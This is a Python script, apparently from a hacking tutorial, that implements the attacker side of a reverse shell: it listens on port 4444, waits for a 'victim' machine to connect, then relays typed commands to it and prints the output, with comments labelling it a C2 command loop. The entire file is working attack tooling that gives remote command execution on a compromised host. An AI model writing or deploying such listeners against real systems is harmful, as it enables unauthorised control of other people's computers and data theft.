import socket

# 0.0.0.0 means "Listen on all network interfaces"
HOST = '0.0.0.0'
PORT = 4444  # The classic "Hacker Port" (but any port works)


def main():
    # 1. Create Socket (TCP)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 2. Bind and Listen
    # (setsockopt allows us to restart the server instantly if it crashes)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)

    print(f"[*] Listening for incoming connections on port {PORT}...")

    # 3. Accept Connection
    # This blocks (waits) until a victim connects
    client_socket, client_address = server.accept()
    print(f"[+] Connection established with {client_address[0]}")

    # 4. The Command Loop (C2)
    while True:
        # Get command from you (the attacker)
        command = input("Shell> ")

        if command.lower() == 'exit':
            client_socket.send('exit'.encode())
            break

        if command.strip() == '':
            continue

        # Send command to victim
        client_socket.send(command.encode())

        # Receive the result (4096 bytes buffer)
        response = client_socket.recv(4096).decode()
        print(response)

    client_socket.close()
    server.close()


if __name__ == '__main__':
    main()